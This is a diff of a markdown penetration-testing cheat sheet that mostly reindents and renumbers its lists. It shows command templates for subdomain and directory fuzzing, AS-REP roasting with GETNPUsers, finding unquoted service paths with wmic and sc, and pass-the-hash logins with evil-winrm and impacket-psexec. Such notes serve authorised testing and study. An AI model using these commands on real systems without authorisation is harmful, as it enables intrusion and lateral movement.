@@ -25,7 +25,7 @@
 - *wfuzz -u main_host -w wordlist -H FUZZ.host.com --sc 200 --hc 302*
 
 ### Dirbuster:
-17. **Common extensions** php/asp/do/html/txt/
+1. **Common extensions** php/asp/do/html/txt/
 18. Scan **subdirectories** for services under a directory
 19. Also use dirb/**big.txt** or multiple wordlists
 20. Scan for **all http ports**
@@ -36,21 +36,21 @@ a. *GETNPUsers.py -no-pass -dc-ip IP domain/user or --users-list list*
 
 ### **Wmic:**
 1. **Weak service permissions**
-a. *wmic service list brief*
+	1. *wmic service list brief*
 2. **Unquoted service paths**
-a. *wmic service get name,pathname,startmode | findstr /I "auto"*
+	1. *wmic service get name,pathname,startmode | findstr /I "auto"*
 
 ### **SC**
 1. **Unquoted service paths**
-a. *sc query*
-b. *sc qc service name*
+	1. *sc query*
+	2. *sc qc service name*
 
 ### **Evil-winrm:**
 1. **Pass-The-Hash**
-a. *evil-winrm -I host-ip -u user -H nthash*
+	1. *evil-winrm -I host-ip -u user -H nthash*
 2. **Download files:**
-a. *evil-winrm download file_name*
+	1. *evil-winrm download file_name*
 
 ### **Impacket-psexec**
 1. **Pass the hash**
-a. *impacket-psexec -hashes lm:nt username@ip*
+	1. *impacket-psexec -hashes lm:nt username@ip*
